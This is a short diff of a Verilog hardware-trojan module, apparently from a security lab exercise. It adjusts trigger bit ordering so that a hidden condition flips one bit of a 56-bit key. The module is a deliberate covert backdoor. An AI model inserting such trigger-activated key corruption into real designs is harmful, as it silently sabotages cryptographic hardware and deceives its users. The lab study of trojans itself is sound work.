@@ -10,10 +10,10 @@
 module  trojan_5(payload, key, trigger);
 
 input	[55:0]	    key;
-input	[31:0]	    trigger;
+  input	[1:32]	    trigger;
 output	[55:0]	    payload;
-reg     [3:0]     condition = 4'b0101;
+  reg     [3:0]     condition = 4'b1010; // lab doc the trigger is b01010 but due to big endiness of the code it has to be flipped
 
-assign payload = (trigger[3:0] == condition[3:0]) ? {key[55:1], ~key[0]} : key[55:0];
+  assign payload = (trigger[1:4] == condition[3:0]) ? {key[55:1], ~key[0]} : key[55:0];
 
 endmodule
